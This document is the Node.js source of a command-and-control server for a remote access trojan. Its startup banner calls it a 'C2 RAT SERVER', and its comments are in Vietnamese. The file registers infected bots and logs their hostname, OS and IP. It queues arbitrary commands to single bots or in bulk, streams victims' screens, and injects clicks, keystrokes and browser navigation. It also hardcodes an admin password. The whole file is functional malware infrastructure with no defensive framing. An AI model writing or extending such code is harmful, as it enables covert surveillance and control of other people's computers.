const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');

// --- INIT ---
const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(express.static('public'));

// ============================================================
//  DATABASE - MEMORY
// ============================================================
const DB = {
    bots: [],
    commands: [],
    pending_commands: [],
    rat_sessions: [],
    admin_logs: []
};

// Stream cache
const streamCache = new Map();

// ============================================================
//  AUTH
// ============================================================
const ADMIN_PASSWORD = 'H3XTEK0';
const auth = (req, res, next) => {
    const token = req.headers['authorization'];
    if (!token || token !== `Bearer ${ADMIN_PASSWORD}`) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    next();
};

// ============================================================
//  WEBSOCKET
// ============================================================
const botClients = new Map();

wss.on('connection', (ws, req) => {
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '0.0.0.0';
    
    ws.on('message', async (message) => {
        try {
            const data = JSON.parse(message);
            const botId = data.bot_id;
            if (!botId) return;

            console.log(`[WS] Received from ${botId}:`, data.type);

            // === REGISTER ===
            if (data.type === 'register') {
                botClients.set(botId, ws);
                
                const existing = DB.bots.findIndex(b => b.bot_id === botId);
                const bot = {
                    bot_id: botId,
                    group_name: data.group || 'default',
                    version: data.version || '1.0.0',
                    os: data.os || 'Unknown',
                    hostname: data.hostname || 'Unknown',
                    ip: clientIp,
                    last_seen: Date.now(),
                    online: 1,
                    screen_width: data.screen_width || 1920,
                    screen_height: data.screen_height || 1080
                };
                if (existing !== -1) {
                    DB.bots[existing] = { ...DB.bots[existing], ...bot };
                } else {
                    DB.bots.push(bot);
                }

                // Gửi pending commands
                const pendings = DB.pending_commands.filter(p => p.bot_id === botId);
                console.log(`[WS] Sending ${pendings.length} pending commands to ${botId}`);
                pendings.forEach(p => {
                    sendCommand(ws, botId, p.cmd_id, p.command, JSON.parse(p.args || '[]'));
                });
                DB.pending_commands = DB.pending_commands.filter(p => p.bot_id !== botId);

                console.log(`[BOT] Registered: ${botId}`);
                ws.send(JSON.stringify({ type: 'registered', bot_id: botId }));
            }

            // === HEARTBEAT ===
            else if (data.type === 'heartbeat') {
                const bot = DB.bots.find(b => b.bot_id === botId);
                if (bot) {
                    bot.last_seen = Date.now();
                    bot.online = 1;
                }
            }

            // === RESULT ===
            else if (data.type === 'result') {
                console.log(`[RESULT] ${botId}: ${data.cmd_id} -> ${data.status}`);
                
                // Tìm command trong DB
                const cmdIndex = DB.commands.findIndex(c => c.cmd_id === data.cmd_id);
                if (cmdIndex !== -1) {
                    DB.commands[cmdIndex].result = data.result;
                    DB.commands[cmdIndex].status = data.status || 'ok';
                    DB.commands[cmdIndex].executed_at = Date.now();
                    console.log(`[RESULT] Updated command ${data.cmd_id}`);
                } else {
                    // Nếu không tìm thấy, tạo mới (fallback)
                    console.log(`[RESULT] Command ${data.cmd_id} not found, creating new`);
                    DB.commands.push({
                        bot_id: botId,
                        cmd_id: data.cmd_id,
                        command: 'unknown',
                        args: '[]',
                        result: data.result,
                        status: data.status || 'ok',
                        issued_at: Date.now(),
                        executed_at: Date.now()
                    });
                }
            }

            // === RAT STREAM ===
            else if (data.type === 'rat_stream') {
                // Lưu frame vào cache
                streamCache.set(botId, {
                    frame: data.image,
                    timestamp: data.timestamp || Date.now()
                });
                // console.log(`[STREAM] Frame from ${botId}, cache size: ${streamCache.size}`);
            }

        } catch (e) {
            console.error('WS Error:', e);
        }
    });

    ws.on('close', () => {
        for (let [id, client] of botClients.entries()) {
            if (client === ws) {
                botClients.delete(id);
                const bot = DB.bots.find(b => b.bot_id === id);
                if (bot) {
                    bot.online = 0;
                }
                console.log(`[BOT] Disconnected: ${id}`);
                break;
            }
        }
    });
});

function sendCommand(ws, botId, cmdId, command, args = []) {
    if (ws && ws.readyState === WebSocket.OPEN) {
        const payload = JSON.stringify({
            type: 'command',
            payload: { cmd_id: cmdId, command, args }
        });
        ws.send(payload);
        console.log(`[CMD] Sent to ${botId}: ${command} (${cmdId})`);
        return true;
    } else {
        console.log(`[CMD] Bot ${botId} not online, queuing`);
        return false;
    }
}

// ============================================================
//  API
// ============================================================

// Lấy danh sách bot
app.get('/api/bots', auth, (req, res) => {
    res.json(DB.bots);
});

// Lấy bot online
app.get('/api/bots/online', auth, (req, res) => {
    res.json(DB.bots.filter(b => b.online === 1));
});

// Xóa bot
app.delete('/api/bots/:bot_id', auth, (req, res) => {
    DB.bots = DB.bots.filter(b => b.bot_id !== req.params.bot_id);
    DB.commands = DB.commands.filter(c => c.bot_id !== req.params.bot_id);
    DB.pending_commands = DB.pending_commands.filter(p => p.bot_id !== req.params.bot_id);
    res.json({ status: 'deleted' });
});

// Gửi lệnh
app.post('/api/command', auth, (req, res) => {
    const { bot_id, command, args = [] } = req.body;
    if (!bot_id || !command) {
        return res.status(400).json({ error: 'Missing bot_id or command' });
    }

    const cmdId = Date.now() + '-' + crypto.randomBytes(4).toString('hex');
    
    // Lưu command vào DB
    const cmdEntry = {
        bot_id: bot_id,
        cmd_id: cmdId,
        command: command,
        args: JSON.stringify(args),
        result: null,
        status: 'pending',
        issued_at: Date.now(),
        executed_at: null
    };
    DB.commands.push(cmdEntry);
    console.log(`[API] Command saved: ${cmdId} for ${bot_id}`);

    // Gửi command
    const ws = botClients.get(bot_id);
    if (ws && ws.readyState === WebSocket.OPEN) {
        sendCommand(ws, bot_id, cmdId, command, args);
        res.json({ status: 'sent', cmd_id: cmdId });
    } else {
        // Lưu vào pending
        DB.pending_commands.push({
            bot_id: bot_id,
            cmd_id: cmdId,
            command: command,
            args: JSON.stringify(args),
            issued_at: Date.now()
        });
        console.log(`[API] Command queued for ${bot_id}`);
        res.json({ status: 'queued', cmd_id: cmdId });
    }
});

// Gửi lệnh hàng loạt
app.post('/api/command/bulk', auth, (req, res) => {
    const { bot_ids, command, args = [] } = req.body;
    if (!bot_ids || !Array.isArray(bot_ids) || bot_ids.length === 0) {
        return res.status(400).json({ error: 'Missing bot_ids array' });
    }

    const results = [];
    bot_ids.forEach(botId => {
        const cmdId = Date.now() + '-' + crypto.randomBytes(4).toString('hex');
        DB.commands.push({
            bot_id: botId,
            cmd_id: cmdId,
            command: command,
            args: JSON.stringify(args),
            result: null,
            status: 'pending',
            issued_at: Date.now(),
            executed_at: null
        });
        
        const ws = botClients.get(botId);
        if (ws && ws.readyState === WebSocket.OPEN) {
            sendCommand(ws, botId, cmdId, command, args);
            results.push({ bot_id: botId, status: 'sent', cmd_id: cmdId });
        } else {
            DB.pending_commands.push({
                bot_id: botId,
                cmd_id: cmdId,
                command: command,
                args: JSON.stringify(args),
                issued_at: Date.now()
            });
            results.push({ bot_id: botId, status: 'queued', cmd_id: cmdId });
        }
    });

    res.json({ results });
});

// Lấy kết quả lệnh
app.get('/api/results/:cmd_id', auth, (req, res) => {
    const cmd = DB.commands.find(c => c.cmd_id === req.params.cmd_id);
    if (cmd) {
        console.log(`[API] Result for ${req.params.cmd_id}: ${cmd.status}`);
        res.json(cmd);
    } else {
        console.log(`[API] Command ${req.params.cmd_id} not found`);
        res.json({});
    }
});

// Lấy kết quả cuối (cho RAT)
app.get('/api/results/latest/:bot_id', auth, (req, res) => {
    const botId = req.params.bot_id;
    console.log(`[API] Getting latest for ${botId}`);
    
    // 1. Lấy từ stream cache trước
    const cached = streamCache.get(botId);
    if (cached && cached.frame) {
        console.log(`[API] Returning cached frame for ${botId}`);
        return res.json({
            cmd_id: 'stream-latest',
            result: cached.frame,
            status: 'ok',
            executed_at: cached.timestamp
        });
    }
    
    // 2. Fallback: lấy từ command sc gần nhất
    const cmds = DB.commands
        .filter(c => c.bot_id === botId && c.command === 'sc')
        .sort((a, b) => (b.executed_at || 0) - (a.executed_at || 0));
    
    if (cmds.length > 0) {
        console.log(`[API] Returning latest sc command for ${botId}`);
        res.json(cmds[0]);
    } else {
        console.log(`[API] No data for ${botId}`);
        res.json({});
    }
});

// Lấy lịch sử
app.get('/api/history/:bot_id', auth, (req, res) => {
    const history = DB.commands
        .filter(c => c.bot_id === req.params.bot_id)
        .sort((a, b) => b.issued_at - a.issued_at)
        .slice(0, 50);
    res.json(history);
});

// Lấy tất cả commands
app.get('/api/commands', auth, (req, res) => {
    res.json(DB.commands);
});

// Lấy pending commands
app.get('/api/pending', auth, (req, res) => {
    res.json(DB.pending_commands);
});

// ============================================================
//  RAT API
// ============================================================

// RAT START
app.post('/api/rat/start', auth, (req, res) => {
    const { bot_id } = req.body;
    if (!bot_id) return res.status(400).json({ error: 'Missing bot_id' });

    const ws = botClients.get(bot_id);
    if (!ws || ws.readyState !== WebSocket.OPEN) {
        return res.status(404).json({ error: 'Bot offline' });
    }

    DB.rat_sessions.push({
        bot_id: bot_id,
        socket_id: 'ws-' + Date.now(),
        session_start: Date.now()
    });

    const cmdId = Date.now() + '-' + crypto.randomBytes(4).toString('hex');
    sendCommand(ws, bot_id, cmdId, 'rat_start', []);
    res.json({ status: 'rat_started', bot_id });
});

// RAT STOP
app.post('/api/rat/stop', auth, (req, res) => {
    const { bot_id } = req.body;
    if (!bot_id) return res.status(400).json({ error: 'Missing bot_id' });

    const ws = botClients.get(bot_id);
    if (ws && ws.readyState === WebSocket.OPEN) {
        const cmdId = Date.now() + '-' + crypto.randomBytes(4).toString('hex');
        sendCommand(ws, bot_id, cmdId, 'rat_stop', []);
    }
    DB.rat_sessions = DB.rat_sessions.filter(r => r.bot_id !== bot_id);
    streamCache.delete(bot_id);
    res.json({ status: 'rat_stopped', bot_id });
});

// RAT EVENT
app.post('/api/rat/event', auth, (req, res) => {
    const { bot_id, event_type, x, y, text, url } = req.body;
    if (!bot_id) return res.status(400).json({ error: 'Missing bot_id' });

    const ws = botClients.get(bot_id);
    if (!ws || ws.readyState !== WebSocket.OPEN) {
        return res.status(404).json({ error: 'Bot offline' });
    }

    const cmdId = Date.now() + '-' + crypto.randomBytes(4).toString('hex');
    let command = 'rat_event';
    let args = [event_type];

    if (event_type === 'click' || event_type === 'rightclick' || event_type === 'doubleclick' || event_type === 'move') {
        args.push(x || 0, y || 0);
    } else if (event_type === 'key') {
        args.push(text || '');
    } else if (event_type === 'notepad') {
        command = 'rat_notepad';
        args = [text || ''];
    } else if (event_type === 'browser') {
        command = 'rat_browser';
        args = [url || 'https://www.google.com'];
    }

    sendCommand(ws, bot_id, cmdId, command, args);
    res.json({ status: 'event_sent', cmd_id: cmdId });
});

// RAT STREAM
app.get('/api/rat/stream/:bot_id', auth, (req, res) => {
    const botId = req.params.bot_id;
    const ws = botClients.get(botId);
    
    if (!ws || ws.readyState !== WebSocket.OPEN) {
        return res.status(404).json({ error: 'Bot offline' });
    }

    const cmdId = Date.now() + '-' + crypto.randomBytes(4).toString('hex');
    sendCommand(ws, botId, cmdId, 'rat_stream', []);
    res.json({ status: 'stream_started', bot_id: botId });
});

// ============================================================
//  DATABASE MANAGEMENT
// ============================================================

app.get('/api/db', auth, (req, res) => {
    res.json(DB);
});

app.get('/api/db/bots', auth, (req, res) => res.json(DB.bots));
app.get('/api/db/commands', auth, (req, res) => res.json(DB.commands));
app.get('/api/db/pending', auth, (req, res) => res.json(DB.pending_commands));

app.delete('/api/db', auth, (req, res) => {
    DB.bots = [];
    DB.commands = [];
    DB.pending_commands = [];
    DB.rat_sessions = [];
    DB.admin_logs = [];
    res.json({ status: 'cleared' });
});

// ============================================================
//  DASHBOARD
// ============================================================

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

app.get('/rat', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'rat.html'));
});

app.get('/style.css', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'style.css'));
});

// ============================================================
//  START
// ============================================================

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log('='.repeat(50));
    console.log('  C2 RAT SERVER STARTED (FIXED)');
    console.log(`  Port: ${PORT}`);
    console.log(`  Dashboard: http://localhost:${PORT}/`);
    console.log(`  RAT Control: http://localhost:${PORT}/rat`);
    console.log(`  Password: H3XTEK0`);
    console.log('='.repeat(50));
    console.log('  Bot clients: 0');
    console.log('  Commands: 0');
    console.log('='.repeat(50));
});
